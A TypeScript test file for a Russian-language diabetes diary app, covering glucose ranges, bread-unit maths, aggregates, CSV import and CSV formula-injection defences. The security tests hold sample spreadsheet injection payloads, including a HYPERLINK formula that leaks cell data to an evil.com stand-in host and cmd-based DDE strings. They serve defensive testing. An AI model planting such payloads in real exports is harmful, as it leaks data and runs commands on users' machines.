import test from 'node:test';
import assert from 'node:assert/strict';
import {
  evaluateGlucose,
  calculateXE,
  calculateDayAggregates,
  calculateMonthlyStats,
  groupEntriesByDay,
  isFormulaInjection,
  escapeFormulaInjection,
  unescapeFormulaInjection,
  formatCsvCell,
  exportEntriesToCSV,
} from './diabetes';
import { DiaryEntry } from '../types/diabetes';

test('evaluateGlucose: correctly evaluates glucose ranges according to user specs', () => {
  // <= 3.9 => low (Низкий)
  assert.equal(evaluateGlucose(3.2)?.status, 'low');
  assert.equal(evaluateGlucose(3.8)?.status, 'low');
  assert.equal(evaluateGlucose(3.9)?.status, 'low');
  assert.equal(evaluateGlucose(3.8)?.shortLabel, 'Низкий');
  assert.equal(evaluateGlucose(3.9)?.shortLabel, 'Низкий');

  // 4.0 .. 9.9 => normal (Норма)
  assert.equal(evaluateGlucose(4.0)?.status, 'normal');
  assert.equal(evaluateGlucose(5.5)?.status, 'normal');
  assert.equal(evaluateGlucose(9.9)?.status, 'normal');
  assert.equal(evaluateGlucose(5.5)?.shortLabel, 'Норма');

  // 10.0 .. 13.9 => high (Высокий)
  assert.equal(evaluateGlucose(10.0)?.status, 'high');
  assert.equal(evaluateGlucose(12.4)?.status, 'high');
  assert.equal(evaluateGlucose(13.9)?.status, 'high');
  assert.equal(evaluateGlucose(11.0)?.shortLabel, 'Высокий');

  // > 13.9 => very_high (Очень высокий)
  assert.equal(evaluateGlucose(14.0)?.status, 'very_high');
  assert.equal(evaluateGlucose(18.5)?.status, 'very_high');
  assert.equal(evaluateGlucose(15.2)?.shortLabel, 'Очень высокий');

  // null / empty / invalid
  assert.equal(evaluateGlucose(null), null);
  assert.equal(evaluateGlucose(undefined), null);
  assert.equal(evaluateGlucose(0), null);
});

test('evaluateGlucose: respects custom target thresholds when settings are passed', () => {
  const custom = { hypoThreshold: 4.4, targetLow: 4.5, targetHigh: 8.5 };
  assert.equal(evaluateGlucose(4.4, custom)?.status, 'low');
  assert.equal(evaluateGlucose(4.5, custom)?.status, 'normal');
  assert.equal(evaluateGlucose(8.5, custom)?.status, 'normal');
  assert.equal(evaluateGlucose(8.6, custom)?.status, 'high');
});

test('calculateXE: correctly divides carbs by 12 and rounds to 1 decimal place', () => {
  assert.equal(calculateXE(12), 1.0);
  assert.equal(calculateXE(24), 2.0);
  assert.equal(calculateXE(36), 3.0);
  assert.equal(calculateXE(18), 1.5);
  assert.equal(calculateXE(25), 2.1);
  assert.equal(calculateXE(0), 0);
  assert.equal(calculateXE(null), null);
  assert.equal(calculateXE(undefined), null);

  // Custom ratio (e.g. 10g or 11g)
  assert.equal(calculateXE(20, 10), 2.0);
});

test('calculateDayAggregates: computes average glucose and totals for a day', () => {
  const mockEntries: DiaryEntry[] = [
    {
      id: '1',
      date: '2026-11-01',
      time: '08:00',
      glucose: 5.4,
      carbs: 48,
      xe: 4.0,
      rinFast: 6,
      tresiba: null,
      calories: 350,
      notes: 'Завтрак',
      createdAt: 1,
    },
    {
      id: '2',
      date: '2026-11-01',
      time: '13:00',
      glucose: 7.2,
      carbs: 60,
      xe: 5.0,
      rinFast: 8,
      tresiba: null,
      calories: 550,
      notes: 'Обед',
      createdAt: 2,
    },
    {
      id: '3',
      date: '2026-11-01',
      time: '22:00',
      glucose: 6.0,
      carbs: 0,
      xe: 0,
      rinFast: null,
      tresiba: 16,
      calories: 0,
      notes: 'На ночь Тресиба',
      createdAt: 3,
    },
  ];

  const summary = calculateDayAggregates(mockEntries);

  assert.equal(summary.date, '2026-11-01');
  assert.equal(summary.entriesCount, 3);
  // Avg glucose: (5.4 + 7.2 + 6.0) / 3 = 18.6 / 3 = 6.2
  assert.equal(summary.avgGlucose, 6.2);
  assert.equal(summary.totalRinFast, 14); // 6 + 8
  assert.equal(summary.totalTresiba, 16); // 16
  assert.equal(summary.totalCarbs, 108); // 48 + 60
  assert.equal(summary.totalXE, 9.0); // 4.0 + 5.0
  assert.equal(summary.totalCalories, 900); // 350 + 550
  assert.equal(summary.minGlucose, 5.4);
  assert.equal(summary.maxGlucose, 7.2);
});

test('groupEntriesByDay: groups and sorts correctly', () => {
  const entries: DiaryEntry[] = [
    {
      id: '1',
      date: '2026-11-01',
      time: '13:00',
      glucose: 6.5,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '',
      createdAt: 1,
    },
    {
      id: '2',
      date: '2026-11-02',
      time: '08:00',
      glucose: 5.0,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '',
      createdAt: 2,
    },
    {
      id: '3',
      date: '2026-11-01',
      time: '08:30',
      glucose: 5.2,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '',
      createdAt: 3,
    },
  ];

  const grouped = groupEntriesByDay(entries);
  assert.equal(grouped.length, 2);
  // Descending date order: 2026-11-02 first, then 2026-11-01
  assert.equal(grouped[0].date, '2026-11-02');
  assert.equal(grouped[1].date, '2026-11-01');

  // Inside 2026-11-01, times must be ascending: 08:30 then 13:00
  assert.equal(grouped[1].entries[0].time, '08:30');
  assert.equal(grouped[1].entries[1].time, '13:00');
});

test('calculateMonthlyStats: calculates TIR and monthly averages', () => {
  const entries: DiaryEntry[] = [
    {
      id: '1',
      date: '2026-11-01',
      time: '08:00',
      glucose: 3.5, // low
      carbs: 24,
      xe: 2.0,
      rinFast: 3,
      tresiba: 14,
      calories: 200,
      notes: '',
      createdAt: 1,
    },
    {
      id: '2',
      date: '2026-11-01',
      time: '12:00',
      glucose: 6.0, // normal
      carbs: 36,
      xe: 3.0,
      rinFast: 5,
      tresiba: null,
      calories: 400,
      notes: '',
      createdAt: 2,
    },
    {
      id: '3',
      date: '2026-11-02',
      time: '08:00',
      glucose: 11.5, // high
      carbs: 48,
      xe: 4.0,
      rinFast: 8,
      tresiba: 14,
      calories: 500,
      notes: '',
      createdAt: 3,
    },
    {
      id: '4',
      date: '2026-11-02',
      time: '19:00',
      glucose: 15.0, // very high
      carbs: 24,
      xe: 2.0,
      rinFast: 6,
      tresiba: null,
      calories: 300,
      notes: '',
      createdAt: 4,
    },
  ];

  const stats = calculateMonthlyStats(entries, '2026-11');
  assert.equal(stats.totalEntries, 4);
  assert.equal(stats.tir.lowCount, 1);
  assert.equal(stats.tir.normalCount, 1);
  assert.equal(stats.tir.highCount, 1);
  assert.equal(stats.tir.veryHighCount, 1);
  assert.equal(stats.tir.lowPercent, 25);
  assert.equal(stats.tir.normalPercent, 25);
  assert.equal(stats.tir.highPercent, 25);
  assert.equal(stats.tir.veryHighPercent, 25);

  assert.equal(stats.activeDaysCount, 2);
  assert.equal(stats.totalRinFast, 22);
  assert.equal(stats.totalTresiba, 28);
  assert.equal(stats.avgDailyTresiba, 14);
});

test('isDayComplete: correctly requires morning, day, and evening', async () => {
  const { isDayComplete } = await import('./diabetes.ts');

  // Complete day with morning (08:00), day (13:00), evening (19:00)
  const fullDay: DiaryEntry[] = [
    { id: '1', date: '2026-11-01', time: '08:00', glucose: 5.5, carbs: 24, xe: 2, rinFast: 6, tresiba: null, calories: null, notes: 'Завтрак', createdAt: 1 },
    { id: '2', date: '2026-11-01', time: '13:00', glucose: 6.2, carbs: 36, xe: 3, rinFast: 8, tresiba: null, calories: null, notes: 'Обед', createdAt: 2 },
    { id: '3', date: '2026-11-01', time: '19:00', glucose: 7.0, carbs: 24, xe: 2, rinFast: 6, tresiba: 14, calories: null, notes: 'Ужин', createdAt: 3 },
  ];
  assert.equal(isDayComplete(fullDay), true);

  // Incomplete day: missing lunch (day)
  const missingLunch: DiaryEntry[] = [
    { id: '1', date: '2026-11-02', time: '08:00', glucose: 5.5, carbs: 24, xe: 2, rinFast: 6, tresiba: null, calories: null, notes: 'Завтрак', createdAt: 1 },
    { id: '3', date: '2026-11-02', time: '19:00', glucose: 7.0, carbs: 24, xe: 2, rinFast: 6, tresiba: 14, calories: null, notes: 'Ужин', createdAt: 3 },
  ];
  assert.equal(isDayComplete(missingLunch), false);

  // Incomplete day: missing evening
  const missingEvening: DiaryEntry[] = [
    { id: '1', date: '2026-11-03', time: '08:00', glucose: 5.5, carbs: 24, xe: 2, rinFast: 6, tresiba: null, calories: null, notes: 'Завтрак', createdAt: 1 },
    { id: '2', date: '2026-11-03', time: '13:00', glucose: 6.2, carbs: 36, xe: 3, rinFast: 8, tresiba: null, calories: null, notes: 'Обед', createdAt: 2 },
  ];
  assert.equal(isDayComplete(missingEvening), false);
});

test('parseExcelDiary: correctly imports complex Russian diabetes CSV/Excel with summary columns', async () => {
  const { parseExcelDiary } = await import('./excelImport.ts');

  const csv = `ДНЕВНИК САМОКОНТРОЛЯ ДИАБЕТА · РинФаст + Тресиба,,,,,,,,,,,,,
"ШКАЛА:  < 5 — низкий  ·  5–10 — норма  ·  > 10 и < 13,9 — высокий  ·  ≥ 13,9 — крайне высокий",,,,,,,,,,,,,
Период: 18 октября — 2 ноября 2026,,,,,,,,22 октября: печенье подтверждено; 24 октября: записей нет,,,,,
,,,,,,,,,,,,,
Дата,Время,Глюкоза (ммоль/л),Оценка (авто),Углеводы (г),ХЕ (авто),РинФаст (ЕД),Тресиба (ЕД),Еда / нагрузка / комментарий,Ср. сахар за день,Замеров за день,Сумма ХЕ за день,РинФаст за день,Ккал (оценка)
18.10.2026,21:00,,,,,5,,Ужин: 4–5 ложек риса и 400 г горбуши; РинФаст 5 ЕД,9,1,0,5,
18.10.2026,22:00,9,Норма,,,,,"Перед сном, измерение",,,,,
18.10.2026,23:30,,,,,,14,Тресиба 14 ЕД,,,,,
19.10.2026,01:00,10.4,Высокий,,,2,,Инъекция РинФаст,9.5777777777777757,18,8.5208333333333339,28,
20.10.2026,11:32,,,,,,,"Завтрак: гречка, хлеб, яблоко, котлета",,,,,505
20.10.2026,22:32,12.4,Высокий,,,3,14,Инъекция РинФаст; Тресиба,,,,,
22.10.2026,После 04:00,,,6,0.5,,,"Сахар 6 г, точное время не указано",,,,,24`;

  const file = new File([csv], 'diary.csv', { type: 'text/csv' });
  const result = await parseExcelDiary(file);

  assert.equal(result.entries.length, 7);

  // Row 1: 18.10.2026 21:00, RinFast 5
  assert.equal(result.entries[0].date, '2026-10-18');
  assert.equal(result.entries[0].time, '21:00');
  assert.equal(result.entries[0].rinFast, 5);
  assert.equal(result.entries[0].glucose, null);

  // Row 2: 18.10.2026 22:00, Glucose 9
  assert.equal(result.entries[1].date, '2026-10-18');
  assert.equal(result.entries[1].time, '22:00');
  assert.equal(result.entries[1].glucose, 9);

  // Row 3: 18.10.2026 23:30, Tresiba 14
  assert.equal(result.entries[2].tresiba, 14);

  // Row 4: 19.10.2026 01:00, Glucose 10.4, RinFast 2 (NOT 28 from 'РинФаст за день'!)
  assert.equal(result.entries[3].date, '2026-10-19');
  assert.equal(result.entries[3].glucose, 10.4);
  assert.equal(result.entries[3].rinFast, 2);

  // Row 5: 20.10.2026 11:32, Calories 505
  assert.equal(result.entries[4].calories, 505);

  // Row 6: 20.10.2026 22:32, Glucose 12.4, RinFast 3, Tresiba 14
  assert.equal(result.entries[5].glucose, 12.4);
  assert.equal(result.entries[5].rinFast, 3);
  assert.equal(result.entries[5].tresiba, 14);

  // Row 7: 22.10.2026 "После 04:00" -> time 04:00, Carbs 6, XE 0.5, Calories 24
  assert.equal(result.entries[6].time, '04:00');
  assert.equal(result.entries[6].carbs, 6);
  assert.equal(result.entries[6].xe, 0.5);
  assert.equal(result.entries[6].calories, 24);
});

// --- ТЕСТЫ БЕЗОПАСНОСТИ CSV / FORMULA INJECTION (SEC-03) ---

test('SEC-03: isFormulaInjection распознает префиксы =, +, -, @, |, % и обходы через пробелы и спецсимволы', () => {
  // 1. Прямые опасные префиксы
  assert.equal(isFormulaInjection('=1+1'), true, '= должен распознаваться');
  assert.equal(isFormulaInjection('=HYPERLINK("http://attacker.com")'), true);
  assert.equal(isFormulaInjection('+cmd|\'/C calc\'!A0'), true, '+ должен распознаваться');
  assert.equal(isFormulaInjection('-2+3+cmd|\'/C calc\'!A0'), true, '- должен распознаваться');
  assert.equal(isFormulaInjection('@SUM(A1:A10)'), true, '@ должен распознаваться');
  assert.equal(isFormulaInjection('|calc'), true, '| должен распознаваться');
  assert.equal(isFormulaInjection('%COMSPEC%'), true, '% должен распознаваться');

  // 2. Обходы через пробелы в начале
  assert.equal(isFormulaInjection('   =1+1'), true, 'Пробелы перед = не должны помогать обойти фильтр');
  assert.equal(isFormulaInjection('      @SUM(B1:B2)'), true);
  assert.equal(isFormulaInjection('\u00A0=1+1'), true, 'Неразрывный пробел (U+00A0) перед = должен блокироваться');

  // 3. Обходы через табуляцию и переносы строк
  assert.equal(isFormulaInjection('\t=1+1'), true, 'Табуляция перед = должна блокироваться');
  assert.equal(isFormulaInjection('\tcmd'), true, 'Ведущая табуляция должна блокироваться');
  assert.equal(isFormulaInjection('\r\n=HYPERLINK()'), true, 'Ведущий перенос строки перед = должен блокироваться');
  assert.equal(isFormulaInjection('\n-1+2'), true, 'Ведущий перенос строки перед - должен блокироваться');

  // 4. Обычные безопасные пользовательские строки и даты не должны помечаться как формулы
  assert.equal(isFormulaInjection('Обед: гречка 150г, курица 120г'), false);
  assert.equal(isFormulaInjection('Завтрак'), false);
  assert.equal(isFormulaInjection('2026-11-02'), false);
  assert.equal(isFormulaInjection('14:30'), false);
  assert.equal(isFormulaInjection('5.5'), false);
  assert.equal(isFormulaInjection(''), false);
  assert.equal(isFormulaInjection('   '), false);
});

test('SEC-03: escapeFormulaInjection и unescapeFormulaInjection обеспечивают полную обратимость (roundtrip)', () => {
  // Опасная формула: при экспорте добавляется ведущий апостроф, при импорте — безопасно снимается
  const dangerous = '=HYPERLINK("http://leak?data=123"; "Отчет")';
  const escaped = escapeFormulaInjection(dangerous);
  assert.equal(escaped, `'${dangerous}`, 'Должен быть добавлен ведущий апостроф');
  const unescaped = unescapeFormulaInjection(escaped);
  assert.equal(unescaped, dangerous, 'Исходная строка должна быть точно восстановлена');

  // Пользовательский список с дефисом
  const bullet = '- Измерен сахар перед сном';
  const escapedBullet = escapeFormulaInjection(bullet);
  assert.equal(escapedBullet, `'- Измерен сахар перед сном`);
  assert.equal(unescapeFormulaInjection(escapedBullet), bullet);

  // Пользовательская запись с плюсом
  const plusNote = '+2 ед РинФаст на коррекцию';
  const escapedPlus = escapeFormulaInjection(plusNote);
  assert.equal(escapedPlus, `'+2 ед РинФаст на коррекцию`);
  assert.equal(unescapeFormulaInjection(escapedPlus), plusNote);

  // Обычная строка не изменяется
  const regular = 'Обычный обед';
  assert.equal(escapeFormulaInjection(regular), regular);
  assert.equal(unescapeFormulaInjection(regular), regular);

  // Строка с одинарной кавычкой не портится, если после кавычки нет триггера формулы
  const quoted = "'Цитата врача'";
  assert.equal(escapeFormulaInjection(quoted), quoted);
  assert.equal(unescapeFormulaInjection(quoted), quoted);
});

test('SEC-03: formatCsvCell корректно экранирует кавычки, разделители, переносы строк и формулы', () => {
  // 1. Пустые значения
  assert.equal(formatCsvCell(null), '');
  assert.equal(formatCsvCell(undefined), '');
  assert.equal(formatCsvCell(''), '');

  // 2. Числовые значения (десятичная запятая для русской локали)
  assert.equal(formatCsvCell(5.5), '5,5');
  assert.equal(formatCsvCell(12), '12');

  // 3. Формула экранируется апострофом и оборачивается в кавычки
  assert.equal(formatCsvCell('=1+1'), "\"'=1+1\"");
  assert.equal(formatCsvCell('   =SUM(A1:A5)'), "\"'   =SUM(A1:A5)\"");
  assert.equal(formatCsvCell('@dangerous'), "\"'@dangerous\"");

  // 4. Текст с кавычками удваивает внутренние кавычки
  assert.equal(formatCsvCell('Заметка с "кавычками"'), '"Заметка с ""кавычками"""');

  // 5. Текст с разделителем (;) оборачивается в кавычки
  assert.equal(formatCsvCell('Чай; печенье'), '"Чай; печенье"');

  // 6. Текст с переносом строки оборачивается в кавычки
  assert.equal(formatCsvCell("Строка 1\nСтрока 2"), "\"Строка 1\nСтрока 2\"");

  // 7. Формула, содержащая кавычки и точку с запятой
  const complexFormula = '=cmd|"/C calc"!A0; test';
  assert.equal(formatCsvCell(complexFormula), '"\'=cmd|""/C calc""!A0; test"');
});

test('SEC-03: exportEntriesToCSV экранирует все текстовые поля, нейтрализует формулы и добавляет UTF-8 BOM', () => {
  const entries: DiaryEntry[] = [
    {
      id: '1',
      date: '2026-11-02',
      time: '12:00',
      glucose: 5.5,
      carbs: 48,
      xe: 4.0,
      rinFast: 4,
      tresiba: null,
      calories: 450,
      notes: '=HYPERLINK("http://evil.com/leak?data="&C2; "Открыть протокол")',
      createdAt: 1,
    },
    {
      id: '2',
      date: '2026-11-02',
      time: '13:00',
      glucose: 8.0,
      carbs: null,
      xe: null,
      rinFast: null,
      tresiba: null,
      calories: null,
      notes: '-2+3+cmd|\'/C calc\'!A0',
      createdAt: 2,
    },
    {
      id: '3',
      date: '2026-11-02',
      time: '14:00',
      glucose: 4.2,
      carbs: 20,
      xe: 1.7,
      rinFast: 2,
      tresiba: null,
      calories: 180,
      notes: '   +cmd|\'/C notepad\'!A0', // обход пробелами
      createdAt: 3,
    },
    {
      id: '4',
      date: '2026-11-02',
      time: '18:00',
      glucose: 6.1,
      carbs: 60,
      xe: 5.0,
      rinFast: 5,
      tresiba: 14,
      calories: 600,
      notes: 'Обычный обед: борщ, хлеб 2 куска; чай с сахарозаменителем',
      createdAt: 4,
    },
  ];

  const csv = exportEntriesToCSV(entries);

  // 1. Проверяем наличие UTF-8 BOM (\uFEFF)
  assert.equal(csv.startsWith('\uFEFF'), true, 'CSV должен начинаться с UTF-8 BOM для корректного открытия в Excel');

  // 2. В файле не должно быть ни одной ячейки, начинающейся прямо с =, +, -, @ без апострофа!
  // Проверяем: после точки с запятой или в начале строки ни одно поле в кавычках не должно начинаться с опасного символа
  assert.equal(csv.includes(';"='), false, 'Не должно быть неэкранированного ;"="');
  assert.equal(csv.includes(';"+'), false, 'Не должно быть неэкранированного ;"+"');
  assert.equal(csv.includes(';"-'), false, 'Не должно быть неэкранированного ;"-"');
  assert.equal(csv.includes(';"@'), false, 'Не должно быть неэкранированного ;"@"');

  // 3. Проверяем наличие защитного апострофа в опасных ячейках
  assert.ok(csv.includes('"\'=HYPERLINK'));
  assert.ok(csv.includes('"\'-2+3+cmd'));
  assert.ok(csv.includes('"\'   +cmd'));

  // 4. Обычная русская запись со знаками препинания должна быть корректно сохранена
  assert.ok(csv.includes('"Обычный обед: борщ, хлеб 2 куска; чай с сахарозаменителем"'));
});

test('SEC-03: Совместимость экспорта в CSV и последующего импорта через parseExcelDiary (полный roundtrip)', async () => {
  const { parseExcelDiary } = await import('./excelImport');

  const originalEntries: DiaryEntry[] = [
    {
      id: 'orig-1',
      date: '2026-11-02',
      time: '08:30',
      glucose: 5.6,
      carbs: 36,
      xe: 3.0,
      rinFast: 4,
      tresiba: 14,
      calories: 320,
      notes: '+2 ед на ДПС перед едой',
      createdAt: 1,
    },
    {
      id: 'orig-2',
      date: '2026-11-02',
      time: '13:15',
      glucose: 6.8,
      carbs: 48,
      xe: 4.0,
      rinFast: 5,
      tresiba: null,
      calories: 450,
      notes: '- Обед в кафе: салат Цезарь; паста',
      createdAt: 2,
    },
    {
      id: 'orig-3',
      date: '2026-11-02',
      time: '19:00',
      glucose: 9.4,
      carbs: 24,
      xe: 2.0,
      rinFast: 3,
      tresiba: null,
      calories: 250,
      notes: '=HYPERLINK("http://safe.org"; "Тестовая ссылка")',
      createdAt: 3,
    },
  ];

  // 1. Экспортируем в защищенный CSV
  const csvContent = exportEntriesToCSV(originalEntries);

  // 2. Имитируем файл браузера и импортируем обратно
  const file = new File([csvContent], 'exported_diary.csv', { type: 'text/csv' });
  const importResult = await parseExcelDiary(file);

  assert.equal(importResult.entries.length, 3, 'Все 3 записи должны успешно импортироваться');

  // 3. Проверяем полное восстановление данных и заметок (без мусора и без лишних апострофов)
  assert.equal(importResult.entries[0].date, '2026-11-02');
  assert.equal(importResult.entries[0].time, '08:30');
  assert.equal(importResult.entries[0].glucose, 5.6);
  assert.equal(importResult.entries[0].notes, '+2 ед на ДПС перед едой', 'Заметка с плюсом должна быть точно восстановлена');

  assert.equal(importResult.entries[1].time, '13:15');
  assert.equal(importResult.entries[1].glucose, 6.8);
  assert.equal(importResult.entries[1].notes, '- Обед в кафе: салат Цезарь; паста', 'Заметка со списком и точкой с запятой восстановлена');

  assert.equal(importResult.entries[2].time, '19:00');
  assert.equal(importResult.entries[2].glucose, 9.4);
  assert.equal(importResult.entries[2].notes, '=HYPERLINK("http://safe.org"; "Тестовая ссылка")', 'Текст формулы безопасно сохранен и восстановлен');
});
